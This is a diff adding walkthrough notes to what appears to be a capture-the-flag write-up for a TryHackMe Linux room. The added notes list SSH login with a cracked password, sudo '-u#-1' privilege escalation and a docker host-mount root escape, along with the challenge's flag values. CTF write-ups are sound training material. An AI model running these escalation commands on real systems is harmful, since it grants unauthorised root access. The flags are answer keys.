@@ -245,6 +245,30 @@ john hash.txt --show
 industryweapon
 
 
+- What is user.txt?
+hint: cd old_robert_ssh
+ssh -i id_rsa robert@127.0.0.1 -p 2222
+pass:industryweapon
+ls
+sudo -l
+sudo -u#-1 /bin/bash
+https://www.exploit-db.com/exploits/47502
+cd /root
+cat user.txt
+user{620fb94d32470e1e9dcf8926481efc96}
+
+
+- What is root.txt?
+hint: ls
+sudo -l
+cd /tmp
+./docker ps -a
+./docker images ls
+/tmp/docker run -v /:/mnt --rm -it mangoman chroot /mnt sh
+id
+ls
+cat root.txt
+root{62ca2110ce7df377872dd9f0797f8476}
 
 
 http://wuvel.net/tryhackme/linux-agency/
